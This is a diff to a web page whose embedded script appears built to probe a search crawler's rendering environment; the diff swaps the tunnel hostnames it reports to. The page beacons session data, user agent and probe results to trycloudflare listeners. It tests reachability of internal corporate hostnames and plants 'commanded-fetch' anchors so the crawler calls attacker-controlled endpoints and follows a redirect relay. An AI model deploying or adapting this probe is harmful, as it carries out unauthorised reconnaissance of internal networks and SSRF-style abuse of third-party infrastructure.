@@ -24,7 +24,7 @@
 <script>
 (function(){
 'use strict';
-var LISTENER_URL='https://catch-chronic-tommy-motivation.trycloudflare.com';
+var LISTENER_URL='https://layer-sciences-reveals-scan.trycloudflare.com';
 var sessionToken='RENDER-TOKEN-gvrp-d4e5f6-'+Math.floor(Math.random()*100000);
 console.log('[OBSERVATORY-INIT] Session started with token: '+sessionToken);
 var probeOutcomes={sessionToken:sessionToken,timestamp:new Date().toISOString(),userAgent:navigator.userAgent,probes:{},errors:[]};
@@ -47,8 +47,8 @@ fastBeacon('/beacon-render-gvrp-1a2b3c','&st='+encodeURIComponent(sessionToken)+
 transmitBeacon('/log-arrival',{sessionToken:sessionToken,phase:'render-start',href:location.href});
 var PROBES=[
  ['P01','https://github.com/','reachable-control'],
- ['P02','https://saints-reel-compressed-visibility.trycloudflare.com/','tunnel-canary'],
- ['P03','https://guild-junction-footwear-settled.trycloudflare.com/','tunnel-canary'],
+ ['P02','https://application-heritage-targets-zshops.trycloudflare.com/','tunnel-canary'],
+ ['P03','https://specified-occasion-ahead-conferences.trycloudflare.com/','tunnel-canary'],
  ['P04','https://definitely-not-real-0xdeadbeef.invalid/','unreachable-control'],
  ['P05','https://momma.corp.google.com/','corp-internal-nxdomain-outside'],
  ['P06','https://rbe-prod.c3.macservice.goog/','corp-internal-nxdomain-outside'],
@@ -94,9 +94,9 @@ fetch('data.json').then(r=>r.text()).then(t=>{document.getElementById('fetchdemo
 <h2>5. Commanded-fetch receipts (crawler-as-executor test)</h2>
 <p>Each anchor below instructs a crawler to fetch a receipt endpoint we control. If our log shows the fetch arriving from Google IP space with Googlebot UA, the crawler executed a third-party-issued fetch command. The relay anchor demonstrates redirect-following under command.</p>
 <ul>
-<li><a href="https://catch-chronic-tommy-motivation.trycloudflare.com/cmd-alpha-gvrp">command ALPHA — fetch receipt</a></li>
-<li><a href="https://catch-chronic-tommy-motivation.trycloudflare.com/cmd-beta-gvrp">command BETA — fetch receipt</a></li>
-<li><a href="https://catch-chronic-tommy-motivation.trycloudflare.com/relay?to=https://example.com/relay-exit-gvrp">command GAMMA — redirect relay</a> (crawler should follow the relay and hit the exit URL)</li>
+<li><a href="https://layer-sciences-reveals-scan.trycloudflare.com/cmd-alpha-gvrp">command ALPHA — fetch receipt</a></li>
+<li><a href="https://layer-sciences-reveals-scan.trycloudflare.com/cmd-beta-gvrp">command BETA — fetch receipt</a></li>
+<li><a href="https://layer-sciences-reveals-scan.trycloudflare.com/relay?to=https://example.com/relay-exit-gvrp">command GAMMA — redirect relay</a> (crawler should follow the relay and hit the exit URL)</li>
 </ul>
 
 
